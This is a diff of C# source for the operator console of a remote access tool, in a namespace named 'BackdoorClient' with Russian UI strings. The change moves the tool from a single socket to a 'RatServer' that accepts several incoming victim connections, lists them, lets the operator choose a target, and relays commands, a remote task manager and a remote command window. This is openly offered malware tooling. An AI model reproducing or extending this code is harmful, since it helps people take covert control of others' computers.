@@ -10,6 +10,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Threading;
 using System.Windows.Forms;
+using System.Net.NetworkInformation;
 
 namespace BackdoorClient
 {
@@ -20,8 +21,7 @@ namespace BackdoorClient
     }
     public partial class Form1 : Form
     {
-        private Socket sockSender = new Socket(new AddressFamily(), SocketType.Stream, ProtocolType.Tcp);
-
+        private RatServer server;
         public Form1()
         {
             InitializeComponent();
@@ -29,104 +29,60 @@ namespace BackdoorClient
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            adressTextBox.Text = "127.0.0.1";
-            portTextBox.Text = "7777";
+            foreach (NetworkInterface netif in NetworkInterface.GetAllNetworkInterfaces())
+            {
+                IPInterfaceProperties properties = netif.GetIPProperties();
+                foreach (IPAddressInformation unicast in properties.UnicastAddresses)
+                    IpAddrBox.Items.Add(unicast.Address);
+            }
         }
 
         private void ConnectButton_Click(object sender, EventArgs e)
         {
             try
             {
-                Connect();
-                connText.Text = "Подключено";
+                server = new RatServer(IpAddrBox.Text, int.Parse(portTextBox.Text));
+                server.OnClientConnect += UpdateConnectionView;
+                server.OnClientDisсonnect += UpdateConnectionView;
+                connText.Text = "Сервер слушает";
             }
             catch (Exception error)
             {
                 connText.Text = "Ошибка не подключено";
             }
         }
-
-        private void sendButton_Click(object sender, EventArgs e)
+        private void UpdateConnectionView()
         {
-            try
+            ConnectionQueue.Invoke(new Action(ConnectionQueue.Nodes.Clear));
+            for (int i = 0; i < server.connection.Count; i++)
             {
-
-                responseText.Text = SendCommandAndGetResponce(commandTextBox.Text);
-            }
-            catch (Exception error)
-            {
-                responseText.Text = error.Message;
+                ConnectionQueue.Invoke(new Action(() => ConnectionQueue.Nodes.Add(server.connection[i].RemoteEndPoint.ToString())));
             }
         }
-        private void commandTextBox_TextEnter(object sender, EventArgs e)
-        {
-
-        }
-        private async void Connect()
-        {
-            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-
-            IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(adressTextBox.Text), int.Parse(portTextBox.Text));
-            sock.Bind(ipEndPoint);
-            await Task.Run(() => sock.Listen(1));
-            sockSender = sock.Accept();
-            sock.Dispose();
-        }
-
         public string SendCommandAndGetResponce(string comm, int maxsize = 10000, MsgCodeMethod codeMethod = MsgCodeMethod.UTF8)
         {
-            byte[] bytes = new byte[maxsize];
-
-            byte[] msg = new byte[1];
-            msg = Encoding.UTF8.GetBytes(comm);
-            commandTextBox.Text = "";
-            try
-            {
-                sockSender.Send(msg);
-            }
-            catch (Exception e)
-            {
-                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                return "";
-            }
-
-            int bytesRec = sockSender.Receive(bytes);
-
-            if (codeMethod == MsgCodeMethod.UTF8)
-                return Encoding.UTF8.GetString(bytes);
-            if (codeMethod == MsgCodeMethod.BASE64)
-                return Convert.ToBase64String(bytes);
-            else
-                throw new ArgumentException("code method invalid");
-            //return Encoding.UTF8.GetString(bytes, 0, bytesRec);
+            return server.SendCommandAndGetResponce(comm, maxsize);
         }
 
         public byte[] SendCommandAndGetBytesResponce(string comm, int maxsize = 10000)
         {
-            byte[] bytes = new byte[maxsize];
-
-            byte[] msg = new byte[1];
-            msg = Encoding.UTF8.GetBytes(comm);
-            commandTextBox.Text = "";
-            try
-            {
-                sockSender.Send(msg);
-            }
-            catch (Exception e)
-            {
-                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                return new byte[1];
-            }
-
-            int bytesRec = sockSender.Receive(bytes);
-
-            return bytes;
+            return server.SendCommandAndGetBytesResponce(comm, maxsize);
         }
 
         public bool TestConnect()
         {
-            if (sockSender == null) return false;
-            else return sockSender.Connected;
+            if (server == null)
+            {
+                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return false;
+            }            
+            return true;
+        }
+
+        private void ConnFromUser_Click(object sender, EventArgs e)
+        {
+            server.SetTarget(ConnectionQueue.Nodes.IndexOf(ConnectionQueue.SelectedNode));
+            ConnctionUserText.Text = ConnectionQueue.SelectedNode.Text;
         }
 
         private async void taskMgrButton_Click(object sender, EventArgs e)
@@ -173,11 +129,11 @@ namespace BackdoorClient
 
         private void DisconnectBtn_Click(object sender, EventArgs e)
         {
-            SendCommandAndGetResponce("abort connection");
-    
-            sockSender.Dispose();
+            //SendCommandAndGetResponce("abort connection");
 
-            sockSender = null;
+            server.DestroyServer();
+
+            server = null;
             connText.Text = "Не подключено";
         }
 
@@ -186,5 +142,7 @@ namespace BackdoorClient
             RemouteCmd remouteCmd = new RemouteCmd(this);
             remouteCmd.Show();
         }
+
+
     }
 }
